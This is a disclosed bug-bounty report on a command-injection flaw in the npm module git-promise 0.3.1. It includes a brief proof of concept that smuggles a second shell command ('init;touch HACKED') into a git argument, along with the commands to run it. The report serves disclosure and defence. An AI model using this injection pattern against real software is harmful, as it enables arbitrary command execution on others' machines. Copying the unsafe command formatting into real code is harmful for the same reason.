# [git-promise] RCE via insecure command formatting

## Report Details
- **Report ID**: 728047
- **URL**: https://hackerone.com/reports/728047
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-11-02T22:35:30.566Z
- **Disclosed**: 2020-04-25T19:33:02.913Z

## Reporter
- **Username**: mik317
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `RCE` issue in the `git-promise` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `git-promise`
**version:** `0.3.1`
**npm page:** `https://www.npmjs.com/package/git-promise`

## Module Description
> Simple wrapper that allows you to run any git command using a more intuitive syntax.

## Module Stats
[~1.5k] downloads in the last day
[11,322] downloads in the last week
[~45k] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/piuccio/git-promise/blob/master/index.js#L9

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var git = require("git-promise");
 
git("init;touch HACKED").then(function (branch) {
  console.log(branch); // This is your current branch
});

```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i git-promise # Install affected module
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :) {F624221}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `git-promise`

## Attachments
- Screenshot_from_2019-11-02_23-31-57.png
